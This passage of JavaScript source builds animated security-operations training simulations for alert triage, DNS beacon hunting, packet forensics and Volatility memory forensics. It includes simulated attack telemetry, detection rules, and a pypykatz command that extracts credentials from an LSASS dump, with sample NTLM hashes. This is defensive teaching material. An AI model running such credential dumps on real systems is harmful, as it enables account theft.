          if (fpFill) fpFill.style.width = '77%';
          if (fpVal)  fpVal.textContent  = '15.4%';
        }, 800 + ciLogPass.length * 320 + 200);
      }, ciLogFail.length * 280 + 400);
    }, 2700);

    // Phase 4: tune FP — rate falls from 15.4% to 2.1%
    timers.later(() => {
      setStep(3, 'running', 'TUNING');
      let li3 = 0;
      timers.every(() => {
        if (li3 >= tuneLog.length) return;
        const ln = tuneLog[li3++];
        if (logEl) { logEl.textContent += ln + '\n'; logEl.scrollTop = logEl.scrollHeight; }
        if (li3 === 4) {
          // FP drops to 2.1%
          if (fpFill) fpFill.style.width = '21%';
          if (fpVal)  fpVal.textContent  = '2.1%';
        }
      }, 380);
    }, 2700 + 2200);
    timers.later(() => { setStep(3, 'done', 'PASS'); }, 2700 + 2200 + tuneLog.length * 380 + 200);

    // Phase 5: deploy to prod
    timers.later(() => {
      setStep(4, 'running', 'DEPLOYING');
      if (ruleState) ruleState.textContent = 'deploying';
    }, 2700 + 2200 + tuneLog.length * 380 + 600);
    timers.later(() => {
      setStep(4, 'done', 'DEPLOYED');
      if (ruleState) ruleState.textContent = 'deployed ✓';
    }, 2700 + 2200 + tuneLog.length * 380 + 1400);
  }

  return { intro, visual, lines, animate };
}

/* ----- 10. Alert Triage — Advanced
 * Visual: 2x2 investigation panels (raw alert | related events table |
 *         threat intel lookups | decision log) + a final escalation banner.
 * Animation: alert 4711 arrives → related events populate → TI hits cascade →
 *            decision log writes line-by-line → escalate to IR banner appears.
 */
function buildAlertTriageSim(skill, meta, lvl) {
  const slug = skill.name.toLowerCase().replace(/[^a-z0-9]+/g, '-');
  const relatedEvents = [
    { t: '09:23:47', src: 'DNS', txt: 'query=wpad.corp.local.gram.cachefly.net. IN TXT', sev: 'crit' },
    { t: '09:23:51', src: 'DNS', txt: 'query=gram.cachefly.net.         IN A',           sev: 'warn' },
    { t: '09:24:02', src: 'Sysmon', txt: 'Image=mshta.exe → http://gram.cachefly.net/p', sev: 'crit' },
    { t: '09:24:18', src: 'Sysmon', txt: 'Image=powershell.exe -NoProfile -enc SQBFAFgA...', sev: 'crit' },
    { t: '09:24:33', src: '4698', txt: 'TaskName=\\SystemHealthMonitor Author=jdoe',    sev: 'warn' }
  ];
  const tiLookups = [
    { ioc: 'gram.cachefly.net', src: 'VT',   res: '4/93 · flagged MALICIOUS (mimikatz C2)', sev: 'crit' },
    { ioc: '185.220.101.42',    src: 'OTX',  res: 'pulse: 12 · APT29 infra cluster',        sev: 'crit' },
    { ioc: 'wpad.corp.local',   src: 'INT',  res: 'internal DNS only — passive',           sev: 'warn' },
    { ioc: 'jdoe',              src: 'AD',    res: 'user — last logon 09:14 WIN10-7',       sev: 'info' }
  ];
  const decisionLog = [
    '[09:25:01] alert 4711 acknowledged by L1 analyst',
    '[09:25:14] raw payload matches Mimikatz signature in DNS TXT (sigma: dns_exfil_mimikatz_signature)',
    '[09:25:42] 3 related Sysmon events confirm code-exec (mshta → powershell -enc)',
    '[09:26:08] threat intel: gram.cachefly.net VT=4/93 · OTX APT29 infra cluster',
    '[09:26:31] persistence confirmed: scheduled task \\SystemHealthMonitor authored by jdoe',
    '[09:26:49] severity upgraded to CRITICAL · kills 4 user sessions recommended',
    '[09:27:12] decision: ESCALATE TO IR — case INC-2025-047 created, IR lead paged'
  ];

  const intro = `<strong>${escapeHtmlS(skill.name)}</strong> @ <strong style="color:var(--neon-2)">Advanced</strong> — ${escapeHtmlS(meta.role)}.
    Multi-system investigation: ${escapeHtmlS(meta.scene)}. Alert 4711 (Mimikatz signature in DNS) is
    investigated across 4 panels — raw alert, related events table, threat-intel lookups, decision log —
    culminating in an escalation to IR. IOC this run: <span class="code-inline">${escapeHtmlS(meta.ioc)}</span>.`;

  const visual = `
    <div class="at-banner-incoming" id="${slug}-incoming">
      <span class="at-banner-ico">🚨</span>
      <span class="at-banner-text">INCOMING ALERT 4711 — Mimikatz signature in DNS query</span>
      <span class="at-banner-meta" id="${slug}-meta">source=zeek_dns · 09:23:47 · sev=HIGH</span>
    </div>
    <div class="at-panels">
      <div class="at-panel siem-panel" style="padding:10px">
        <div class="siem-head"><span>// RAW ALERT</span><span id="${slug}-raw-state">untriaged</span></div>
        <div class="at-raw" id="${slug}-raw">
          <div class="at-raw-row"><b>alert_id:</b> 4711</div>
          <div class="at-raw-row"><b>source:</b> zeek_dns</div>
          <div class="at-raw-row"><b>timestamp:</b> 2025-01-14T09:23:47.182Z</div>
          <div class="at-raw-row"><b>sigma:</b> dns_exfil_mimikatz_signature</div>
          <div class="at-raw-row"><b>src_host:</b> WIN10-7.corp.local (10.0.0.42)</div>
          <div class="at-raw-row"><b>query:</b> wpad.corp.local.gram.cachefly.net. IN TXT</div>
          <div class="at-raw-row"><b>severity:</b> HIGH</div>
        </div>
      </div>
      <div class="at-panel siem-panel" style="padding:10px">
        <div class="siem-head"><span>// RELATED EVENTS (±5 min)</span><span id="${slug}-rel-count">0</span></div>
        <div class="at-related" id="${slug}-related"></div>
      </div>
      <div class="at-panel siem-panel" style="padding:10px">
        <div class="siem-head"><span>// THREAT INTEL LOOKUPS</span><span id="${slug}-ti-count">0/4</span></div>
        <div class="at-ti" id="${slug}-ti"></div>
      </div>
      <div class="at-panel siem-panel" style="padding:10px">
        <div class="siem-head"><span>// DECISION LOG</span><span id="${slug}-dec-state">open</span></div>
        <div class="at-decision-log" id="${slug}-dec"></div>
      </div>
    </div>
    <div class="at-escalate-banner" id="${slug}-escalate" style="display:none">
      <span class="at-esc-ico">⬆</span>
      <span class="at-esc-text">ESCALATED TO IR — case INC-2025-047 created · IR lead paged</span>
    </div>
  `;

  const lines = [
    `$ # Alert triage — advanced investigation @ ${ts()}`,
    `$ # ${lvlLine(lvl, 'open')} — ${lvlLine(lvl, 'close')}`,
    '$ # alert 4711 arrives in SOC L1 queue:',
    '[!] ALERT 4711  sev=HIGH  sigma=dns_exfil_mimikatz_signature',
    '    src_host=WIN10-7.corp.local (10.0.0.42)  query=wpad...cachefly.net. IN TXT',
    '$ # 1. inspect raw alert payload:',
    '[ok] Mimikatz signature matches in DNS TXT payload (exfil pattern)',
    '$ # 2. pull related events (±5 min, same host):',
    '[ok] 5 related events: 2 DNS + 2 Sysmon (mshta, powershell -enc) + 1 4698 (schtasks)',
    '$ # 3. threat intel lookups on the 3 suspicious observables:',
    '[!] gram.cachefly.net  → VT 4/93 MALICIOUS · OTX pulse: APT29 infra cluster',
    '[!] 185.220.101.42    → OTX pulse: 12 hits · APT29 cobalt-strike infra',
    '$ # 4. correlate with AD: jdoe (compromised) authored scheduled task \\SystemHealthMonitor',
    '$ # 5. decision log:',
    '[ok] severity upgraded to CRITICAL · 4 user sessions to be killed',
    '[ok] decision: ESCALATE TO IR — case INC-2025-047 created, IR lead paged',
    '$ # → remediation proposal: isolate WIN10-7, reset jdoe creds, hunt for lateral via 4624 LogonType=3'
  ];

  function animate(host, timers) {
    const incoming = host.querySelector('#' + slug + '-incoming');
    const metaEl = host.querySelector('#' + slug + '-meta');
    const rawState = host.querySelector('#' + slug + '-raw-state');
    const relEl = host.querySelector('#' + slug + '-related');
    const relCount = host.querySelector('#' + slug + '-rel-count');
    const tiEl = host.querySelector('#' + slug + '-ti');
    const tiCount = host.querySelector('#' + slug + '-ti-count');
    const decEl = host.querySelector('#' + slug + '-dec');
    const decState = host.querySelector('#' + slug + '-dec-state');
    const escBanner = host.querySelector('#' + slug + '-escalate');

    // idempotent reset
    if (incoming) incoming.classList.remove('arrived');
    if (rawState) rawState.textContent = 'untriaged';
    if (relEl) relEl.innerHTML = '';
    if (relCount) relCount.textContent = '0';
    if (tiEl) tiEl.innerHTML = '';
    if (tiCount) tiCount.textContent = '0/4';
    if (decEl) decEl.innerHTML = '';
    if (decState) decState.textContent = 'open';
    if (escBanner) escBanner.style.display = 'none';

    // Phase 1: alert arrives
    timers.later(() => {
      if (incoming) incoming.classList.add('arrived');
      if (metaEl) metaEl.textContent = 'source=zeek_dns · 09:23:47 · sev=HIGH';
      if (rawState) rawState.textContent = 'triaging...';
    }, 300);

    // Phase 2: related events populate (one by one)
    timers.later(() => {
      let ri = 0;
      timers.every(() => {
        if (ri >= relatedEvents.length) return;
        const e = relatedEvents[ri++];
        if (!relEl) return;
        const row = document.createElement('div');
        row.className = 'at-related-row ' + e.sev;
        row.innerHTML = '<span class="at-rel-time">' + e.t + '</span>' +
                        '<span class="at-rel-src">' + e.src + '</span>' +
                        '<span class="at-rel-txt">' + e.txt + '</span>';
        relEl.appendChild(row);
        if (relCount) relCount.textContent = ri;
      }, 420);
    }, 1300);

    // Phase 3: threat intel lookups cascade
    timers.later(() => {
      let ti = 0;
      timers.every(() => {
        if (ti >= tiLookups.length) return;
        const t = tiLookups[ti++];
        if (!tiEl) return;
        const row = document.createElement('div');
        row.className = 'at-ti-row ' + t.sev;
        row.innerHTML = '<span class="at-ti-ioc">' + t.ioc + '</span>' +
                        '<span class="at-ti-src">' + t.src + '</span>' +
                        '<span class="at-ti-res">' + t.res + '</span>';
        tiEl.appendChild(row);
        if (tiCount) tiCount.textContent = ti + '/4';
      }, 480);
    }, 3500);

    // Phase 4: decision log writes line-by-line, escalate banner appears at end
    timers.later(() => {
      let di = 0;
      timers.every(() => {
        if (di >= decisionLog.length) return;
        const ln = decisionLog[di++];
        if (decEl) {
          const row = document.createElement('div');
          row.className = 'at-decision-row' + (di === decisionLog.length ? ' escalate' : '');
          row.textContent = ln;
          decEl.appendChild(row);
          decEl.scrollTop = decEl.scrollHeight;
        }
        if (decState) {
          if (di === decisionLog.length) {
            decState.textContent = 'escalated';
            decState.classList.add('err');
            if (escBanner) escBanner.style.display = '';
            if (rawState) rawState.textContent = 'escalated ✓';
          } else if (di >= 5) {
            decState.textContent = 'escalating...';
          }
        }
      }, 560);
    }, 6300);
  }

  return { intro, visual, lines, animate };
}

/* ============================================================
 *  BATCH A BUILDERS — registry map
 *  Keys MUST match SKILL_META names exactly
 * ============================================================ */
const BATCH_A_BUILDERS = {
  'Splunk SPL':                buildSplunkSPLSim,
  'Splunk CIM':                buildSplunkCIMSim,
  'Splunk Alerts/Dashboards':  buildSplunkAlertsDashboardsSim,
  'Sysmon':                    buildSysmonSim,
  'Windows Event Logs':        buildWindowsEventLogsSim,
  'Kibana':                    buildKibanaSim,
  'Log Parsing':               buildLogParsingSim,
  'Sigma Rule Authoring':     buildSigmaRuleAuthoringSim,
  'Detection Engineering':    buildDetectionEngineeringSim,
  'Alert Triage':              buildAlertTriageSim
};

/* ============================================================
 *  BATCH B — Threat Hunting & Forensics (10 skills)
 *  Each builder produces a UNIQUE visual + animation + terminal.
 *  Skill slug prefixes ensure globally-unique element IDs.
 * ============================================================ */

/* ---------- 1. Hypothesis-driven Hunting (Advanced) ----------
 * Visual: HUNT BOARD — hypothesis banner on top, two-column body
 * (left = testable queries + DNS log hits, right = pivot trail),
 * verdict panel at the bottom.
 * Level: advanced → multi-system hypothesis → test → pivot → confirm.
 */
function buildHypothesisDrivenHuntingSim(skill, meta, lvl) {
  const visual = `
    <div class="hunt-board" id="hdh-board">
      <div class="hunt-hypothesis" id="hdh-hyp">
        <span class="hunt-hyp-tag">// HYPOTHESIS H1</span>
        <span class="hunt-hyp-text">Adversaries are using DNS for C2 beaconing with low-TTL A records (TTL &le; 60s, qname churn &ge; 12 subdomains/day, parent domain &lt; 30d old)</span>
      </div>
      <div class="hunt-cols">
        <div class="hunt-col">
          <div class="sim-h">// TESTABLE QUERIES</div>
          <div class="hunt-query pending" id="hdh-q1">
            <span class="hq-tag">Q1</span>
            <span class="hq-spl">| tstats count from datamodel=Network_Resolution where DNS.ttl &lt; 60 by DNS.query</span>
          </div>
          <div class="hunt-query pending" id="hdh-q2">
            <span class="hq-tag">Q2</span>
            <span class="hq-spl">| zeek-cut dns.log id.resp_h query | sort | uniq -c | sort -rn</span>
          </div>
          <div class="hunt-query pending" id="hdh-q3">
            <span class="hq-tag">Q3</span>
            <span class="hq-spl">| whois -h whois.iana.org bad-tld.xyz | grep -iE 'created|registrar'</span>
          </div>
          <div class="hunt-results" id="hdh-results">
            <div class="sim-h" style="margin-top:6px">// DNS LOG HITS (grouped by qname)</div>
            <div class="hr-row pending" data-i="0"><span class="hr-cnt">0</span><span class="hr-qname">a1.bad-tld.xyz</span></div>
            <div class="hr-row pending" data-i="1"><span class="hr-cnt">0</span><span class="hr-qname">a2.bad-tld.xyz</span></div>
            <div class="hr-row pending" data-i="2"><span class="hr-cnt">0</span><span class="hr-qname">a3.bad-tld.xyz</span></div>
            <div class="hr-row pending" data-i="3"><span class="hr-cnt">0</span><span class="hr-qname">cdn.bad-tld.xyz</span></div>
          </div>
        </div>
        <div class="hunt-col">
          <div class="sim-h">// PIVOT TRAIL</div>
          <div class="pivot-trail" id="hdh-pivots">
            <div class="pt-step pending" data-i="0"><span class="pt-lbl">ENTITY</span><span class="pt-val">10.0.0.42 (jdoe-wkstn, finance OU)</span></div>
            <div class="pt-arrow">&darr;</div>
            <div class="pt-step pending" data-i="1"><span class="pt-lbl">BEHAVIOR</span><span class="pt-val">DNS queries to *.bad-tld.xyz every 60.0s ± 0.4s</span></div>
            <div class="pt-arrow">&darr;</div>
            <div class="pt-step pending" data-i="2"><span class="pt-lbl">ARTIFACT</span><span class="pt-val">TXT records carrying 47-byte base64 chunks</span></div>
            <div class="pt-arrow">&darr;</div>
            <div class="pt-step pending" data-i="3"><span class="pt-lbl">INSIGHT</span><span class="pt-val">Cobalt Strike beacon — DNS cat-paw profile (T1071.004)</span></div>
          </div>
        </div>
      </div>
      <div class="hunt-verdict pending" id="hdh-verdict">
        <span class="hv-tag">// VERDICT</span>
        <span class="hv-text">PENDING — awaiting pivot completion</span>
      </div>
    </div>
  `;
  const lines = [
    `$ # Hypothesis-driven Hunt @ ${ts()} — advanced investigation`,
    `$ # ${lvlLine(lvl,'open')} — ${lvlLine(lvl,'close')}`,
    `$ # Goal: prove or disprove the DNS C2 beaconing hypothesis`,
    '$ # Step 1 — articulate hypothesis + falsifiable signals',
    '[ok] H1:    Adversaries use DNS A records (TTL &lt; 60s) for C2 beaconing',
    '[ok] H1.a:  qname churn &ge; 12 distinct subdomains/day per infected host',
    '[ok] H1.b:  parent domain registered within the last 30 days',
    '$ # Step 2 — enumerate testable queries across the fleet',
    '[ok] Q1 (Splunk): tstats count by DNS.query where TTL &lt; 60',
    '[ok] Q2 (Zeek):   zeek-cut dns.log query | uniq -c | sort -rn',
    '[ok] Q3 (passive): whois domain-age on parent zone bad-tld.xyz',
    '$ # Step 3 — execute hypothesis test on 24h DNS logs',
    '[+] 47 distinct subdomains under bad-tld.xyz hit in the last 24h',
    '[+] bad-tld.xyz registered 11 days ago (registrar: nycg.privatemailproxy)',
    '[!] TTL distribution: 128 queries @ 60s, 12 @ 30s, 3 @ 600s',
    '$ # Step 4 — pivot across systems: entity &rarr; behavior &rarr; artifact &rarr; insight',
    '[ok] ENTITY:   10.0.0.42 (jdoe-wkstn, joined finance 2024-09)',
    '[ok] BEHAVIOR: queries every 60.0s ± 0.4s jitter — beacon pattern',
    '[ok] ARTIFACT: TXT records decoded &rarr; "GET /id?id=44&b=v1"',
    '[ok] INSIGHT:  Cobalt Strike DNS cat-paw profile, matches ATT&CK T1071.004',
    '$ # Step 5 — corroborate with related-system signals',
    '[+] DC01 Security 4624 Logon Type 3 from 10.0.0.42 @ 02:11:42',
    '[+] Sysmon EID 1: powershell.exe -enc <base64> parent=mshta.exe',
    '[+] Defender EID 1116: behavior block on lsass.exe write attempt',
    '[!] CONFIRMED — H1 supported by 4 corroborating signals',
    '$ # Produce remediation proposal',
    '[ok] 1. Isolate 10.0.0.42 (Quarantine VLAN 999)',
    '[ok] 2. Block *.bad-tld.xyz at recursive resolver',
    '[ok] 3. Hunt sibling beacons on 10.0.0.0/24',
    '[ok] 4. Reset jdoe creds + revoke Kerberos tickets (klist purge)',
    '[ok] 5. Draft new detection rule dns_low_ttl_beacon (CI test next sprint)'
  ];

  function animate(host, timers) {
    const board = host.querySelector('#hdh-board');
    if (!board) return;
    // idempotent reset
    board.querySelectorAll('.pending,.running,.hit').forEach(e => {
      e.classList.remove('running','hit');
      e.classList.add('pending');
    });
    board.querySelectorAll('.hr-cnt').forEach(c => c.textContent = '0');
    const verdict = host.querySelector('#hdh-verdict .hv-text');
    if (verdict) verdict.textContent = 'PENDING — awaiting pivot completion';
    host.querySelector('#hdh-verdict').classList.add('pending');
    host.querySelector('#hdh-verdict').classList.remove('confirmed');

    // queries Q1..Q3 → running → hit
    ['hdh-q1','hdh-q2','hdh-q3'].forEach((id, i) => {
      timers.later(() => {
        const q = host.querySelector('#' + id);
        if (q) { q.classList.remove('pending'); q.classList.add('running'); }
      }, 600 + i * 1000);
      timers.later(() => {
        const q = host.querySelector('#' + id);
        if (q) { q.classList.remove('running'); q.classList.add('hit'); }
      }, 600 + i * 1000 + 700);
    });

    // DNS log hit rows — count-up via timers.later chain
    const counts = [128, 64, 47, 12];
    const rows = host.querySelectorAll('#hdh-results .hr-row');
    rows.forEach((row, i) => {
      timers.later(() => {
        row.classList.remove('pending');
        row.classList.add('running');
      }, 3200 + i * 800);
      for (let k = 1; k <= 8; k++) {
        timers.later(() => {
          const cnt = row.querySelector('.hr-cnt');
          if (cnt) cnt.textContent = Math.min(counts[i], Math.floor(counts[i] * k / 8));
        }, 3200 + i * 800 + k * 90);
      }
      timers.later(() => {
        const cnt = row.querySelector('.hr-cnt');
        if (cnt) cnt.textContent = counts[i];
        row.classList.remove('running');
        row.classList.add('hit');
      }, 3200 + i * 800 + 850);
    });

    // pivot trail
    const pivots = host.querySelectorAll('#hdh-pivots .pt-step');
    pivots.forEach((p, i) => {
      timers.later(() => {
        p.classList.remove('pending');
        p.classList.add('running');
      }, 6600 + i * 1200);
      timers.later(() => {
        p.classList.remove('running');
        p.classList.add('hit');
      }, 6600 + i * 1200 + 900);
    });

    // verdict
    timers.later(() => {
      if (verdict) {
        verdict.textContent = 'CONFIRMED — Cobalt Strike DNS beacon, T1071.004, 4 corroborating signals';
      }
      const v = host.querySelector('#hdh-verdict');
      if (v) { v.classList.remove('pending'); v.classList.add('confirmed'); }
    }, 12300);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- 2. Network Forensics / Packet Analysis (Advanced) ----------
 * Visual: WIRESHARK-STYLE PACKET TABLE using existing .ws-cap classes
 * (~15 frames of DNS TXT exfiltration scrolling up; frame 8 flagged red).
 * Level: advanced → multi-step pcap analysis, tshark pivots, exfil reassembly.
 */
function buildNetworkForensicsPacketAnalysisSim(skill, meta, lvl) {
  const frames = [
    ['1','0.000','10.0.0.42','192.168.1.1','DNS','Standard query 0x4a7f A a1.bad-tld.xyz'],
    ['2','0.014','192.168.1.1','10.0.0.42','DNS','Standard query response A 185.43.21.9'],
    ['3','0.812','10.0.0.42','192.168.1.1','DNS','Standard query 0x4a80 A a2.bad-tld.xyz'],
    ['4','0.826','192.168.1.1','10.0.0.42','DNS','Standard query response A 185.43.21.9'],
    ['5','1.612','10.0.0.42','192.168.1.1','DNS','Standard query 0x4a81 TXT cdn.bad-tld.xyz'],
    ['6','1.628','192.168.1.1','10.0.0.42','DNS','Standard query response TXT "Zm9vYmFy"'],
    ['7','2.402','10.0.0.42','192.168.1.1','TCP','51322 → 53 [SYN] Seq=0 Win=64240'],
    ['8','2.414','10.0.0.42','192.168.1.1','DNS','Standard query 0x4a82 TXT cdn.bad-tld.xyz'],
    ['9','2.430','192.168.1.1','10.0.0.42','DNS','Standard query response TXT "aGVsbG8gd29ybGQ="'],
    ['10','3.218','10.0.0.42','192.168.1.1','DNS','Standard query 0x4a83 TXT cdn.bad-tld.xyz'],
    ['11','3.234','192.168.1.1','10.0.0.42','DNS','Standard query response TXT "cGF5bG9hZCBnb2VzIGJycg=="'],
    ['12','4.012','10.0.0.42','192.168.1.1','TCP','51325 → 53 [ACK] Seq=41 Ack=81 Win=64160'],
    ['13','4.818','10.0.0.42','192.168.1.1','DNS','Standard query 0x4a84 A a3.bad-tld.xyz'],
    ['14','4.832','192.168.1.1','10.0.0.42','DNS','Standard query response A 185.43.21.9'],
    ['15','5.614','10.0.0.42','192.168.1.1','DNS','Standard query 0x4a85 TXT cdn.bad-tld.xyz']
  ];
  const visual = `
    <div class="ws-cap" id="nfp-cap" style="margin-top:8px">
      <div class="ws-cap-head">
        <span>NO.</span><span>TIME</span><span>SOURCE</span><span>DESTINATION</span><span>PROTO</span><span>INFO</span>
      </div>
      <div class="ws-cap-body" id="nfp-body"></div>
    </div>
    <div class="nfp-stats" id="nfp-stats">
      <span class="ns-kpi"><span class="ns-lbl">frames</span> <span class="ns-val" id="nfp-frames">0</span></span>
      <span class="ns-kpi"><span class="ns-lbl">DNS TXT</span> <span class="ns-val" id="nfp-txt">0</span></span>
      <span class="ns-kpi"><span class="ns-lbl">bad-tld hits</span> <span class="ns-val warn" id="nfp-bad">0</span></span>
      <span class="ns-kpi"><span class="ns-lbl">flagged frame</span> <span class="ns-val crit" id="nfp-flag">—</span></span>
    </div>
  `;
  const lines = [
    `$ # Network Forensics — PCAP analysis @ ${ts()} — advanced investigation`,
    `$ # ${lvlLine(lvl,'open')} — ${lvlLine(lvl,'close')}`,
    `$ # Capture: capture.pcapng (47 MB, 23 min)`,
    '$ tshark -r capture.pcapng -Y "dns.qry.type == TXT" -T fields -e frame.number -e dns.qry.name -e dns.txt -E separator=,',
    '[+] 128 TXT queries to *.bad-tld.xyz over 23 min — anomalous',
    '$ tshark -r capture.pcapng -q -z conv,udp',
    '[ok] UDP convs: 47 hosts, outlier 10.0.0.42:53 &harr; 8.8.8.8:53 (12 MB)',
    '$ # Extract TXT payloads and decode',
    '$ tshark -r capture.pcapng -Y "dns.txt && ip.src==10.0.0.42" -T fields -e dns.txt | tr -d \'"\' | base64 -d | head -3',
    '[ok] GET /id?id=44&b=v1',
    '[ok] GET /id?id=44&b=v2',
    '[ok] GET /id?id=44&b=v3',
    '[!] 47 distinct base64 chunks → reconstruct as a 12 MB exfil stream',
    '$ # Reconstruct exfiltrated payload',
    '$ for i in $(tshark -r capture.pcapng -Y "dns.txt && ip.src==10.0.0.42" -T fields -e dns.txt | tr -d \'"\' | sort -u); do echo $i | base64 -d 2>/dev/null; done > exfil.bin',
    '[ok] exfil.bin → 11.8 MB; file exfil.bin → "data" (looks like db dump)',
    '$ # Confirm exfil with TLS handshake fingerprint',
    '$ tshark -r capture.pcapng -Y "tls.handshake.type == 1 && ip.src==10.0.0.42" -T fields -e tls.handshake_extensions_server_name | sort | uniq -c',
    '[!] SNI hostnames: 4 hits to cdn.bad-tld.xyz, 2 to update.bad-tld.xyz',
    '$ # Generate findings report',
    '[ok] F-01 CRITICAL: DNS tunneling exfil 12 MB from 10.0.0.42 over 23 min',
    '[ok] F-02 HIGH:     TXT record count anomaly (128 vs baseline 0.4/hour)',
    '[ok] F-03 MEDIUM:   TLS 1.0 still negotiated in handshake (frame 8)',
    '$ # Remediation proposal',
    '[ok] block *.bad-tld.xyz at resolver, isolate 10.0.0.42, hunt for sibling beacons',
    '[ok] draft new Suricata rule: alert dns any any → any 53 (msg:"bad-tld DNS tunnel"; dns.query; content:"bad-tld.xyz")'
  ];

  function animate(host, timers) {
    const body = host.querySelector('#nfp-body');
    if (!body) return;
    body.innerHTML = '';
    const framesEl = host.querySelector('#nfp-frames');
    const txtEl    = host.querySelector('#nfp-txt');
    const badEl    = host.querySelector('#nfp-bad');
    const flagEl   = host.querySelector('#nfp-flag');
    if (framesEl) framesEl.textContent = '0';
    if (txtEl) txtEl.textContent = '0';
    if (badEl) badEl.textContent = '0';
    if (flagEl) flagEl.textContent = '—';

    let i = 0, n = 0, txtN = 0, badN = 0;
    timers.every(() => {
      if (!body) return;
      const f = frames[i % frames.length];
      i++; n++;
      const isFlagged = (f[0] === '8');
      const isBad = /bad-tld/.test(f[5]);
      const isTxt = /TXT/.test(f[4]) || /TXT/.test(f[5]);
      const cls = 'ws-row ' + (isFlagged ? 'err' : isBad ? 'warn' : isTxt ? 'sip' : 'ok');
      const row = document.createElement('div');
      row.className = cls;
      row.innerHTML = `<span>${f[0]}</span><span>${f[1]}</span><span>${f[2]}</span><span>${f[3]}</span><span>${f[4]}</span><span>${f[5]}</span>`;
      body.appendChild(row);
      while (body.children.length > 9) body.removeChild(body.firstChild);
      if (isTxt) txtN++;
      if (isBad) badN++;
      if (framesEl) framesEl.textContent = n;
      if (txtEl) txtEl.textContent = txtN;
      if (badEl) badEl.textContent = badN;
      if (isFlagged && flagEl) {
        flagEl.textContent = '#' + f[0];
        flagEl.classList.add('crit');
      }
    }, 720);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- 3. Memory Forensics (Volatility 3) (Intermediate) ----------
 * Visual: vol.py CLI SESSION — command palette (chips) on top, process
 * tree (pstree output) in the middle, malfind hits panel on bottom.
 * Level: intermediate → daily workflow running standard vol plugins.
 */
function buildMemoryForensicsVolatility3Sim(skill, meta, lvl) {
  const visual = `
    <div class="vol-session" id="vol3-sess">
      <div class="vol-cmdbar">
        <span class="sim-h">// vol.py command palette</span>
        <div class="vol-cmds" id="vol3-cmds">
          <span class="vol-cmd pending" data-i="0">windows.info</span>
          <span class="vol-cmd pending" data-i="1">windows.pslist</span>
          <span class="vol-cmd pending" data-i="2">windows.pstree</span>
          <span class="vol-cmd pending" data-i="3">windows.malfind</span>
          <span class="vol-cmd pending" data-i="4">windows.lsass</span>
        </div>
      </div>
      <div class="vol-cols">
        <div class="vol-panel">
          <div class="sim-h">// pstree (PID / PPID / create time)</div>
          <div class="vol-proctree" id="vol3-pstree">
            <div class="vol-proc pending" data-i="0"><span class="vp-i">0x4</span><span class="vp-name">System</span><span class="vp-pid">4</span></div>
            <div class="vol-proc pending" data-i="1" style="margin-left:14px"><span class="vp-i">└</span><span class="vp-name">services.exe</span><span class="vp-pid">500</span></div>
            <div class="vol-proc pending" data-i="2" style="margin-left:28px"><span class="vp-i">└</span><span class="vp-name">svchost.exe</span><span class="vp-pid">712</span><span class="vp-flag">!</span></div>
            <div class="vol-proc pending" data-i="3" style="margin-left:42px"><span class="vp-i">└</span><span class="vp-name">powershell.exe</span><span class="vp-pid">4812</span><span class="vp-flag">!</span></div>
            <div class="vol-proc pending" data-i="4" style="margin-left:28px"><span class="vp-i">└</span><span class="vp-name">lsass.exe</span><span class="vp-pid">696</span><span class="vp-flag">!!</span></div>
          </div>
        </div>
        <div class="vol-panel">
          <div class="sim-h">// malfind — lsass.exe PID 696</div>
          <div class="vol-malfind" id="vol3-malfind">
            <div class="vol-mf-row pending" data-i="0">
              <span class="vm-addr">0x00000000047a0000</span>
              <span class="vm-mnem">0xbad00bad</span>
              <span class="vm-prot">RWX</span>
            </div>
            <div class="vol-mf-row pending" data-i="1">
              <span class="vm-addr">0x00000000048a0000</span>
              <span class="vm-mnem">0xbad00bad</span>
              <span class="vm-prot">RWX</span>
            </div>
            <div class="vol-mf-row pending" data-i="2">
              <span class="vm-addr">0x00000000049b0000</span>
              <span class="vm-mnem">0x4d 5a 90 00 03</span>
              <span class="vm-prot">RWX</span>
            </div>
            <div class="vol-mf-verdict pending" id="vol3-mf-verdict">// verdict: PENDING</div>
          </div>
        </div>
      </div>
    </div>
  `;
  const lines = [
    `$ # Memory Forensics — Volatility 3 @ ${ts()}`,
    `$ # ${lvlLine(lvl,'open')} — ${lvlLine(lvl,'close')}`,
    `$ # Evidence: memory.dmp (4 GB, Win10 build 19041) — case INC-2025-047`,
    '$ vol.py -f memory.dmp windows.info',
    '[ok] OS: Windows 10 build 19041 (1909), KernelBase 10.0.19041.1',
    '$ vol.py -f memory.dmp windows.pslist --pid 696',
    '[ok] lsass.exe PID 696 PPID 500 create 2025-01-04 02:11:42 UTC',
    '$ vol.py -f memory.dmp windows.pstree --pid 500',
    '[warn] services.exe(500) &rarr; svchost.exe(712) &rarr; powershell.exe(4812)',
    '[warn] services.exe(500) &rarr; lsass.exe(696)',
    '$ vol.py -f memory.dmp windows.malfind --pid 696',
    '[!] lsass.exe PID 696 0x00000000047a0000 0xbad00bad  RWX',
    '[!] lsass.exe PID 696 0x00000000048a0000 0xbad00bad  RWX',
    '[!] lsass.exe PID 696 0x00000000049b0000 4d 5a 90 00 03  RWX  (MZ header)',
    '[ok] malfind hit on lsass.exe — likely mimikatz orlsass injection',
    '$ vol.py -f memory.dmp windows.lsass --dump',
    '[ok] lsass.dmp saved (3.2 MB), sha256=4f8c7a13...e201',
    '$ # Confirm with extracted LSASS dump',
    '$ pypykatz lsa minidump lsass.dmp',
    '[!] credentials extracted:',
    '[!]   jdoe:NTLM:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e167c931',
    '[!]   svc_backup:NTLM:b4b9b02a6d8f6c8f3a1e0d3c9e7b6a5f',
    '[ok] workflow complete — finding logged to /cases/INC-2025-047/memory/'
  ];

  function animate(host, timers) {
    const sess = host.querySelector('#vol3-sess');
    if (!sess) return;
    sess.querySelectorAll('.pending,.running,.hit').forEach(e => {
      e.classList.remove('running','hit'); e.classList.add('pending');
    });
    const verdict = host.querySelector('#vol3-mf-verdict');
    if (verdict) {
      verdict.textContent = '// verdict: PENDING';
      verdict.classList.remove('hit','malicious');
      verdict.classList.add('pending');
    }

    // commands → running → hit sequentially
    const cmds = host.querySelectorAll('#vol3-cmds .vol-cmd');
    cmds.forEach((c, i) => {
      timers.later(() => {
        c.classList.remove('pending');
        c.classList.add('running');
      }, 400 + i * 1400);
      timers.later(() => {
        c.classList.remove('running');
        c.classList.add('hit');
      }, 400 + i * 1400 + 900);
    });

    // pstree appears after windows.pstree (i=2)
    const procs = host.querySelectorAll('#vol3-pstree .vol-proc');
